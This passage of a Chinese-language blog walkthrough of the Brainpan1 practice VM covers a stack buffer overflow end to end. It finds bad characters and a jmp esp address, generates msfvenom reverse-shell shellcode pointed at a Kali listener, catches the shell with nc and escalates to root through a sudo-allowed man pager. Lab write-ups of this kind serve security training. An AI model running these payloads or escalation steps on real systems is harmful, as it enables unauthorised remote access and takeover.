+<h3 id="关键特点：-1"><a href="#关键特点：-1" class="headerlink" title="关键特点："></a>关键特点：</h3><ol>
+<li><strong>栈的 “定位器”</strong>：程序运行时的栈用于存放临时数据（比如函数参数、局部变量、函数调用后的返回地址），ESP 始终指向栈顶的位置 —— 栈数据的压入（<code>push</code>）或弹出（<code>pop</code>）都会通过修改 ESP 的值来实现（比如 <code>push</code> 指令会让 ESP 减小，<code>pop</code> 指令会让 ESP 增大）。</li>
+<li><strong>缓冲区溢出中的作用</strong><br><strong>：</strong><ul>
+<li><strong>当发生缓冲区溢出时，溢出的数据会从缓冲区向栈的高位地址覆盖，而 ESP 指向的栈顶区域往往是攻击者用来存放恶意代码的位置；</strong></li>
+<li><strong>攻击者常通过控制 EIP 跳转到 ESP 指向的地址（或其附近），让 CPU 执行栈中存放的恶意代码。</strong></li>
+</ul>
+</li>
+</ol>
+<p><strong>举个例子：执行</strong><code>push eax</code> 时，CPU 会先把 ESP 的值减 4（x86 架构栈是向下生长的），再把 eax 的值存入 ESP 新指向的内存地址；执行 <code>pop ebx</code> 时，会先把 ESP 指向地址的数据读入 ebx，再把 ESP 的值加 4。</p>
+</blockquote>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong>EDX 是 *<em><strong>x86 架构 CPU 中的 “数据寄存器”（Extended Data Register）</strong>，属于通用寄存器，主要用于</em>*存储数据、参与算术 &#x2F; 逻辑运算，或作为函数调用的参数 &#x2F; 返回值载体</strong>。</p>
+<h3 id="关键特点：-2"><a href="#关键特点：-2" class="headerlink" title="关键特点："></a>关键特点：</h3><ol>
+<li><strong>通用数据操作</strong>：可临时存放整数、内存地址或运算中间结果，比如配合 EAX 处理乘法（EDX 存储乘法结果的高位）、除法（EDX 存储余数）等操作。</li>
+<li><strong>程序调用约定</strong>：在某些调用规范（如 cdecl）中，EDX 可用于传递函数参数；也常作为系统调用的参数寄存器（比如 Windows API 或 Linux 系统调用）。</li>
+<li><strong>漏洞分析中的作用</strong>：调试程序时，EDX 可能存放关键数据（如缓冲区地址、输入长度），攻击者可通过观察 EDX 的值辅助构造溢出 payload（比如利用 EDX 指向的地址跳转执行恶意代码）。</li>
+</ol>
+<p><strong>简单说，EDX 是 CPU 处理数据的 “临时存储区”，既服务于常规运算，也能在漏洞利用中作为辅助定位的线索。</strong></p>
+</blockquote>
+<p><strong>A 是</strong><code>EDX</code> 的地址</p>
+<p><strong>B 是</strong><code>EIP</code> 的地址，固定</p>
+<p><strong>C 是</strong><code>ESP</code> 的地址，一个正常反弹 shell 的 payload 是 350-400bit，这里不够，尝试扩容。</p>
+<p><strong>扩容之后看看程序的****崩溃反应是否正常(即跟 600 时一样)</strong>，如果不一样，说明 <code>ESP</code> 就放不下我们的 <code>payload</code> 了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406418.png" alt="image-20251202211932063"></p>
+<p>**这里我们给他 500 个看看什么反应 **<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406419.png" alt="image-20251202212840849"></p>
+<p><strong>还是重启程序，再执行新的</strong><code>payload</code></p>
+<p><strong>这时候看 C 字符&#x2F;ESP****存放的范围</strong><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406420.png" alt="image-20251202213153172"> <img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406421.png" alt="image-20251202213249695"></p>
+<p>**范围是 **<code>005FF910--005FFAE4</code></p>
+<p><strong>可以用 python 查看这段范围的长度 是 468 字节，足够写一个完整的 payload 了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406422.png" alt="image-20251202213408532"></p>
+<h2 id="坏字符识别"><a href="#坏字符识别" class="headerlink" title="坏字符识别"></a>坏字符识别</h2><blockquote>
+<p><strong>[!NOTE]</strong></p>
+<h3 id="一、什么是坏字符？"><a href="#一、什么是坏字符？" class="headerlink" title="一、什么是坏字符？"></a>一、什么是坏字符？</h3><p><strong>坏字符（Bad Characters）是指****会被目标程序 &#x2F; 协议过滤、截断或解析出错的字符</strong>，这类字符会导致缓冲区溢出的 payload 失效（比如 payload 被截断、程序崩溃异常）。</p>
+<p><strong>不同程序，不同通讯协议都会产生不同的坏字符</strong></p>
+<p><strong>常见的坏字符包括：</strong></p>
+<ul>
+<li>**空字符 **<code>\x00</code>（C 语言中字符串结束符，会截断 payload）；</li>
+<li>**换行符 **<code>\x0a</code>、回车符 <code>\x0d</code>（部分程序会将其识别为输入结束）；</li>
+<li>**制表符 **<code>\x09</code>、转义符 <code>\x1b</code>，或特定协议规定的保留字符（如 HTTP 中的 <code>\x20</code> 空格、<code>\x26</code> &amp; 等）。</li>
+</ul>
+<h3 id="二、怎么识别坏字符？"><a href="#二、怎么识别坏字符？" class="headerlink" title="二、怎么识别坏字符？"></a>二、怎么识别坏字符？</h3><p><strong>核心思路是****向目标程序发送包含所有可能字符的序列，对比内存中实际接收的内容，找出缺失 &#x2F; 被篡改的字符</strong>，步骤如下：</p>
+<h4 id="1-构造字符序列"><a href="#1-构造字符序列" class="headerlink" title="1. 构造字符序列"></a>1. 构造字符序列</h4><p>**生成从 **<code>\x00</code> 到 <code>\xff</code> 的完整字节序列（共 256 个字符），比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x01\x02\x03\x04...\xfe\xff</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-发送序列并调试"><a href="#2-发送序列并调试" class="headerlink" title="2. 发送序列并调试"></a>2. 发送序列并调试</h4><p><strong>将这个序列作为 payload 发送给目标程序，用调试器（如 Immunity Debugger）附加程序，查看内存中实际接收的 payload：</strong></p>
+<ul>
+<li><strong>若某字符之后的内容全部消失 → 该字符是坏字符；</strong></li>
+<li><strong>若某字符被替换成其他值 → 该字符也是坏字符。</strong></li>
+</ul>
+<h4 id="3-逐个排除"><a href="#3-逐个排除" class="headerlink" title="3. 逐个排除"></a>3. 逐个排除</h4><ul>
+<li>**先排除明确的坏字符（如 **<code>\x00</code>），再将剩下的字符重新构造序列发送，重复验证；</li>
+<li>**最终得到 ****“安全字符表”**（所有不会被过滤的字符），用于后续构造 payload。</li>
+</ul>
+<h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><p>**比如发送序列 **<code>\x00\x01\x02...\xff</code> 后，调试器中看到内存里只有 <code>\x01\x02\x03</code>，<code>\x00</code> 及之后的字符都消失 → 说明 <code>\x00</code> 是坏字符；若到 <code>\x0a</code> 后截断 → <code>\x0a</code> 也是坏字符。</p>
+<p><strong>识别坏字符是缓冲区溢出利用的关键步骤，能避免 payload 因字符问题失效。</strong></p>
+</blockquote>
+<p><strong>看一下 ESP 空间内有哪些坏字符</strong></p>
+<p><strong>这里把\x00 扔了,因为其本身就是坏字符</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406423.png" alt="image-20251202214047721"></p>
+<p><strong>根据这些字符，修改我们的 payload</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406424.png" alt="image-20251202214439343"></p>
+<p><strong>重启.exe 程序，执行我们的 payload，此时程序崩溃暂停</strong><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406425.png" alt="image-20251202214626080"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406426.png" alt="image-20251202214553108"></p>
+<p>**看左下：内存的窗口。 **	<strong>从第一个开始</strong><code>\x01</code> 转储为 <code>01</code> 直到我们给他的 <code>\xff</code> 转储为 <code>FF</code> 都是完整的，无错误的</p>
+<p><strong>说明除了 <code>\x00</code> 没有坏字符</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406427.png" alt="image-20251202215110884"></p>
+<p><strong>有坏字符的情况是什么样的？</strong>	<strong>都是有 00 且不连续的</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406428.png" alt="image-20251202215427113"></p>
+<h2 id="jmp-esp-定位"><a href="#jmp-esp-定位" class="headerlink" title="jmp esp 定位"></a>jmp esp 定位</h2><p>**找到坏字符 **<code>\x00</code> 后，尝试利用 <code>esp</code></p>
+<p><strong>利用的方式是：在程序中定位到</strong><code>esp</code> 的地址，因为他是不确定的</p>
+<p><strong>他在运行时的时候确实是</strong><code>eip</code> 结束之后去执行 <code>esp</code>，但具体在哪个位置上不确定（<code>eip</code> 的作用：下一条指令执行什么）</p>
+<p><strong>通过</strong><code>eip</code> 的 4 个字节，写上 <code>esp</code> 的地址，用 <code>eip</code> 的地址重定向到 <code>esp</code></p>
+<p><strong>也就说在溢出之后的下一条指令 <code>eip中</code> 我要执行 重定向到 <code>esp</code>。在汇编语言中的写法就是 <code>jmp esp</code></strong></p>
+<p><strong>。因为我们要把反弹 shell 写到 500 的 <code>esp</code> 的位置上</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406429.png" alt="image-20251203202329904"></p>
+<p><code>asm</code> 表示汇编</p>
+<p><code>jmp esp</code> 是汇编语言的一条基本指令</p>
+<p><strong>我们用</strong><code>jmp esp</code> 的时候不能直接写在 <code>eip</code> 的位置上，要写他的 <strong>操作码 FFE4 的地址</strong>	<code>msf-nasm_shell</code> 汇编相关库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406430.png" alt="image-20251203202829571"></p>
+<p><strong>如何找指令</strong><code>jmp esp</code> 操作码 <code>FFE4</code> 的地址：</p>
+<p>**拿到操作码后，回到 **<code>Immunity Debug</code>，因为这个工具可以用 python 语言执行一些自动化的命令</p>
+<p>**这里我们用到 ****<code>!mona modules</code>**<img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406431.png" alt="image-20251203203900375"> <strong>列出所有的模块</strong></p>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><code>!mona modules</code> 是 <strong>Immunity Debugger</strong> 中 <code>Mona.py</code> 脚本的核心命令，用于<strong>列出目标进程加载的所有模块（DLL&#x2F;EXE）及其关键信息</strong>（如基地址、大小、ASLR&#x2F;DEP 保护状态等），是漏洞分析、利用开发（尤其是缓冲区溢出、ROP 链构造）中的高频操作。</p>
+<p><strong>漏洞利用中，通常需要找****未开启 ASLR&#x2F;DEP</strong> 的模块（这类模块基地址固定，便于构造 ROP 链或 shellcode）</p>
+<table>
+<thead>
+<tr>
+<th><code>ASLR</code></th>
+<th><strong>是否启用****地址空间布局随机化</strong>（ASLR）：<code>True</code>&#x2F;<code>False</code>。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>DEP</code></td>
+<td><strong>是否启用****数据执行保护</strong>（DEP）：<code>True</code>&#x2F;<code>False</code>。</td>
+</tr>
+<tr>
+<td><code>SafeSEH</code></td>
+<td><strong>是否启用****安全结构化异常处理</strong>（SafeSEH）：<code>True</code>&#x2F;<code>False</code>。</td>
+</tr>
+<tr>
+<td><code>OS module</code></td>
+<td><strong>是否为系统模块（如</strong><code>kernel32.dll</code>）：<code>True</code>&#x2F;<code>False</code>。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><strong>要找到在现在自己的 Windows 里面的程序中，能够允许我执行</strong><code>jump esp</code> 这个跳转。跳转过程中对于哪个模块能满足我的要求进行筛选。我现在就在用 <code>mona</code> 这个 python 写的 <code>Immunity Debugger</code> 的自动化脚本来筛选</p>
+<p><strong>也就是</strong><strong><code>!mona modules</code></strong><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406431.png" alt="image-20251203203900375"> <strong>列出所有的模块</strong>，之后直接看显示的模块信息 <code>Module info</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406432.png" alt="image-20251203204909670"></p>
+<p><strong>重点关注的是****黄色</strong>的安全机制，都是 False 最好，都是 True 就无法利用了。</p>
+<p><strong>这里的</strong><code>brainpan.exe</code> 全是 False，安全机制都没有启用。</p>
+<p>**看看这个模块有没有 **<code>jump esp</code> 这个指令利用（实践很经常利用）</p>
+<ul>
+<li><code>!mona find -s &quot;\xff\xe4&quot; -m brainpan.exe</code></li>
+<li><strong>从</strong><code>brainpan.exe</code> 查找 <code>jump esp</code> 的操作码 <code>FFE4</code></li>
+<li><code>-s</code> 代表 <code>string</code> 字符串</li>
+<li><code>-m</code> 代表 <code>module</code> 模块</li>
+<li>**结果：总共找到一个指针； **<code>\ff\xe4</code> 的地址是 <strong><code>0x311712f3</code></strong></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406433.png" alt="image-20251203205633780"></p>
+<p>**将这个地址 ****<code>0x311712f3</code>**写到 <code>eip</code> 里面，就会重定向到 <code>esp</code> 里面</p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p>**在我们写入 ****<code>0x311712f3</code>**的时候，要把它按字节倒序来写。不同指令集的 CPU <strong>大小端显示</strong>不同，<strong>主流都是小端显示</strong></p>
+</blockquote>
+<p>** **<code>\ff\xe4</code> 的地址是 <strong><code>0x311712f3</code></strong> 按字节倒序  <code>\xf3\x12\x17\x31</code></p>
+<p>**这样就把 **<code>jump esp</code> 的地址写入了 <code>eip</code> 当中。<code>eip</code> 看到并跳转到这个地址，执行这个指令，跳转到 <code>esp</code> 我们 payload 的地方</p>
+<h2 id="构造-payload-反弹-shell"><a href="#构造-payload-反弹-shell" class="headerlink" title="构造 payload 反弹 shell"></a>构造 payload 反弹 shell</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406434.png" alt="image-20251203211007007"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows/shell_reverse_tcp LHOST=kaliIP LPORT=443 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f c</span><br></pre></td></tr></table></figure>
+
+<h3 id="一、命令各部分解析"><a href="#一、命令各部分解析" class="headerlink" title="一、命令各部分解析"></a>一、命令各部分解析</h3><h4 id="1-sudo"><a href="#1-sudo" class="headerlink" title="1. sudo"></a>1. <code>sudo</code></h4><p>**以 root 权限执行（确保 **<code>msfvenom</code> 可访问所有资源，部分场景下非必需，但建议使用）。</p>
+<h4 id="2-msfvenom"><a href="#2-msfvenom" class="headerlink" title="2. msfvenom"></a>2. <code>msfvenom</code></h4><p><strong>Metasploit 框架的.payload 生成器，用于创建恶意代码（Shellcode、可执行文件等），结合编码器、格式器适配不同漏洞利用场景。</strong></p>
+<h4 id="3-p-windows-shell-reverse-tcp"><a href="#3-p-windows-shell-reverse-tcp" class="headerlink" title="3. -p windows/shell_reverse_tcp"></a>3. <code>-p windows/shell_reverse_tcp</code></h4><ul>
+<li><code>-p</code>（<code>--payload</code>）：指定要生成的 payload 类型；</li>
+<li><code>windows/shell_reverse_tcp</code>：Windows 系统下的<strong>反向 TCP Shell</strong>—— 目标机执行后，主动连接攻击者的 Kali 主机，建立交互式 Shell 会话。</li>
+</ul>
+<h4 id="4-LHOST-kaliIP-LPORT-443"><a href="#4-LHOST-kaliIP-LPORT-443" class="headerlink" title="4. LHOST=kaliIP LPORT=443"></a>4. <code>LHOST=kaliIP LPORT=443</code></h4><ul>
+<li><code>LHOST</code>：攻击者 Kali 主机的 IP 地址（目标机将反向连接此 IP）；</li>
+<li><code>LPORT</code>：攻击者监听的端口（此处用 443，是 HTTPS 默认端口，可绕过部分防火墙检测）。</li>
+</ul>
+<h4 id="5-b-x00"><a href="#5-b-x00" class="headerlink" title="5. -b &quot;\x00&quot;"></a>5. <code>-b &quot;\x00&quot;</code></h4><ul>
+<li><code>-b</code>（<code>--bad-chars</code>）：指定<strong>坏字符</strong>，生成的 Shellcode 中会避免包含这些字符；</li>
+<li><code>\x00</code>：ASCII 空字符，在漏洞利用中可能导致字符串截断（如 C 语言字符串以 <code>\x00</code> 结尾），因此需排除。</li>
+</ul>
+<h4 id="6-e-x86-shikata-ga-nai"><a href="#6-e-x86-shikata-ga-nai" class="headerlink" title="6. -e x86/shikata_ga_nai"></a>6. <code>-e x86/shikata_ga_nai</code></h4><ul>
+<li><code>-e</code>（<code>--encoder</code>）：指定编码器，对 Shellcode 进行加密变形，规避杀毒软件或漏洞利用中的字符限制；</li>
+<li><code>x86/shikata_ga_nai</code>：Metasploit 中最常用的 x86 架构编码器，采用多态变形技术（每次编码结果不同），能有效绕过简单特征检测。</li>
+</ul>
+<h4 id="7-f-c"><a href="#7-f-c" class="headerlink" title="7. -f c"></a>7. <code>-f c</code></h4><ul>
+<li><code>-f</code>（<code>--format</code>）：指定输出格式；</li>
+<li><code>c</code>：C 语言数组格式 —— 生成的 Shellcode 会以 <code>unsigned char buf[] = &#123;...&#125;;</code> 的形式输出，可直接嵌入 C&#x2F;C++ 漏洞利用代码中。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406435.png" alt="image-20251203211521010"></p>
+<p><strong>生成 351 字节&#x2F;byte，完全能放下</strong>	<strong>1byte&#x3D;8bit</strong></p>
+<p><strong>编辑我们的 payload</strong></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>许多编码器的工作机制都会引入****NOP（空指令）作为副作用</strong>，所以我们一般都要在 <code>shellcode</code> 之前<strong>预留上十几个字节的 \x90</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406436.png" alt="image-20251203212146338"></p>
+<p><strong>至此 payload 编写完成</strong></p>
+<p><strong>在</strong><code>Immunity Debug</code> 中重新启动 <code>brainpan.exe</code>，kali 中打开 <code>sudo nc -lvnp 443</code> 监听，执行我们的 payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406437.png" alt="image-20251203212425950"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406438.png" alt="image-20251203212441880"></p>
+<h3 id="本地测试成功"><a href="#本地测试成功" class="headerlink" title="本地测试成功"></a>本地测试成功</h3><p>**可以看到，**<strong>成功反弹我们自己 Windows 系统的 shell</strong></p>
+<h2 id="成功利用缓冲区漏洞"><a href="#成功利用缓冲区漏洞" class="headerlink" title="成功利用缓冲区漏洞"></a>成功利用缓冲区漏洞</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406439.png" alt="image-20251203213725453"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=kaliIP LPORT=443 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f c</span><br></pre></td></tr></table></figure>
+
+<p><strong>生成 Linux 的反弹 shell，425 字节</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406440.png" alt="image-20251203214037841"></p>
+<p><strong>同样是启动监听，执行 payload</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406441.png" alt="image-20251203214133418"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406442.png" alt="image-20251203214150626"></p>
+<p><strong>提高交互性</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythoy -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406443.png" alt="image-20251203214319579"></p>
+<p><code>checksrv.sh</code> 就说明了为什么我们对的是一个 Windows32 位的 exe 溢出，却在 Linux 服务器下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406444.png" alt="image-20251203214531128"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406445.png" alt="image-20251203214709074"></p>
+<p><strong>当前用户可以不输入密码以 root 身份执行</strong><code>anansi_util</code> 这个二进制文件，不知道是干什么的，先 <code>sudo</code> 执行试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406446.png" alt="image-20251203214829385"></p>
+<p><strong>他让输入</strong><code>action</code> 我们输入 <code>manual(简称：man 译为：手册)</code> 后面跟一个操作（随便给他一个）。作用是查看一个 <code>command</code> 的操作手册</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406447.png" alt="image-20251203215123727"></p>
+<p><strong>告诉我们终端功能不完整，不管他。回车之后</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406448.png" alt="image-20251203215226960"></p>
+<p><strong>**发现最后一行可以输东西，类似于</strong><code>less</code>，直接输入 <code>!/bin/bash**</code></p>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong>这里是利用 <code>manual（简称man）</code> 去查看一个 <code>command</code> 帮助手册时，在帮助里面提权</strong></p>
+</blockquote>
+<h2 id="提权成功"><a href="#提权成功" class="headerlink" title="提权成功"></a>提权成功</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406449.png" alt="image-20251203215924732"></p>
+<p><strong>没有 flag</strong></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><h3 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320155406450.png" alt="image-20251203221353250"></p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/03/20/靶机精炼-思路为王（三）/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tr0ll-%E6%B2%A1%E6%9C%89%E5%A4%A7%E6%8B%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%EF%BC%8C%E5%8D%B4%E5%8C%85%E5%90%AB-10-%E5%A4%9A%E7%A7%8D%E6%8A%80%E5%B7%A7%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">Tr0ll - 没有大招的一次渗透，却包含 10 多种技巧。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP-%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">FTP 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95-ftp-%E5%8C%BF%E5%90%8D%E7%99%BB%E9%99%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">尝试 ftp 匿名登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-AI-%E4%B8%8B%E4%B8%80%E6%AD%A5%E5%BB%BA%E8%AE%AE%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">✅ AI 下一步建议：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%8D-%E5%88%86%E6%9E%90%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9C%AC%E5%9C%B0%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">🔍 分析命令（本地）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%8D-%E5%BF%AB%E9%80%9F%E6%8F%90%E5%8F%96%E4%BF%A1%E6%81%AF%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">🔍 快速提取信息（命令行）：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">Web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">根据提示信息获取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">查看文件的具体步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E7%AB%AF%E5%8F%A3-ssh-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84-crackmapexec"><span class="toc-number">1.4.</span> <span class="toc-text">22 端口 ssh 密码喷射 crackmapexec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%9F%E7%84%B6%E7%9C%9F%E6%88%90%E5%8A%9F%E4%BA%86%E3%80%82%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">1.4.1.</span> <span class="toc-text">竟然真成功了。。。。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell"><span class="toc-number">1.5.</span> <span class="toc-text">获得初始 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A5%BD%E4%BA%A4%E4%BA%92%E5%BC%8F-shell"><span class="toc-number">1.5.1.</span> <span class="toc-text">获得更好交互式 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.5.2.</span> <span class="toc-text">查看自动任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E5%92%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.3.</span> <span class="toc-text">查看目录和文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">自动任务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%BD%E7%84%B6%E6%9C%89%E6%8A%A5%E9%94%99%EF%BC%8C%E4%BD%86%E8%B7%9F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%97%A0%E5%85%B3%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%9B%9E%E8%BD%A6"><span class="toc-number">1.6.1.</span> <span class="toc-text">虽然有报错，但跟写入文件内容无关，直接回车</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root"><span class="toc-number">1.7.</span> <span class="toc-text">root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E5%A6%86%E7%85%A7"><span class="toc-number">1.7.1.</span> <span class="toc-text">定妆照</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-number">1.8.1.</span> <span class="toc-text">思维导图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%92%8C%E8%A6%81%E7%82%B9"><span class="toc-number">1.8.2.</span> <span class="toc-text">问题和要点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9ABrainpan1-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%85%B8%E5%9E%8B%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%8C%E8%AE%A9%E4%BD%A0%E4%B8%80%E6%AC%A1%E5%90%83%E9%80%8F%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">靶机精讲：Brainpan1 - 缓冲区溢出典型利用过程，让你一次吃透。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-1"><span class="toc-number">2.1.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 